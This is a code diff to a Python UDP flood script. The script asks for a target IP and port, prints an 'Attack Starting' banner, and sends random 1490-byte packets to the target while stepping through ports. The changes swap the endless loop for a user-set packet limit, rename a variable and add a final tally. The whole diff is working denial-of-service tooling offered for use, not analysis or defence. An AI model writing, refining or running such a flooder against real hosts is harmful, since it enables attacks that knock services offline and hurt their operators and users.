@@ -5,8 +5,6 @@ import socket
 import random
 from datetime import datetime
 
-MAX_PACKETS = 99999
-
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -16,7 +14,7 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+data = random._urandom(1490)
 #############
 
 os.system("clear")
@@ -27,6 +25,7 @@ print("")
 
 ip = input("IP Target : ")
 port = int(input("Port       : "))
+max_packets = int(input("Max Packets: "))
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -42,11 +41,11 @@ print("[====================] 100%")
 time.sleep(1)
 
 sent = 0
-while True:
+while sent < max_packets:
     try:
-        sock.sendto(bytes, (ip, port))
-        sent = sent + 1
-        port = port + 1
+        sock.sendto(data, (ip, port))
+        sent += 1
+        port += 1
         print(f"Sent {sent} packet to {ip} through port:{port}")
         if port == 65534:
             port = 1
@@ -56,3 +55,5 @@ while True:
     except Exception as e:
         print(f"\n[!] Error: {e}")
         sys.exit()
+
+print(f"\n[+] Finished. Total packets sent: {sent}")
